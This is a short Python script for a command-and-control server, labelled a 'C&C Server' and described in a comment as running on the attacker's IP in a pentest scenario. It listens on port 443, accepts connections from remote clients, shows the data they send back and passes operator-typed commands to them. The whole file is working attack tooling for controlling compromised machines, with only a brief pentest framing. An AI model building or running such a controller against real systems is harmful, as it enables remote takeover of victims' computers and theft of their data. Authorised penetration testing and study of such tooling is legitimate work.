import socket
import threading

# Server configuration
HOST = "192.168.8.107"  # IP address of the server (attacker's IP in a pentest scenario)
PORT = 443              # Port number to listen on (must match the client's configuration)

# Function to handle communication with a connected client
def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")  # Log new connection
    try:
        while True:
            # Receive data from the client
            data = conn.recv(4096)  # Buffer size is 4096 bytes
            if not data:
                break  # If no data is received, client has disconnected

            # Display received data
            print(f"[{addr}] {data.decode(errors='ignore')}")

            # Prompt user to enter a command to send to the client
            command = input(f"Command for {addr} ('exit' to close): ")

            # Send the command to the client
            conn.sendall(command.encode())

            # If the command is 'exit', close the connection
            if command.lower() == "exit":
                break
    except Exception as e:
        print(f"[-] Error with {addr}: {e}")  # Handle any errors during communication
    finally:
        conn.close()  # Ensure the connection is closed
        print(f"[-] Disconnected {addr}")  # Log disconnection

# Function to start the server and listen for incoming connections
def start_server():
    # Create a TCP socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the specified IP and port
    server.bind((HOST, PORT))

    # Start listening for incoming connections (max 5 queued connections)
    server.listen(5)
    print(f"[+] C&C Server listening on {HOST}:{PORT}")

    # Main loop to accept and handle incoming connections
    while True:
        conn, addr = server.accept()  # Accept a new connection
        # Start a new thread to handle the client
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

# Entry point of the script
if __name__ == "__main__":
    start_server()
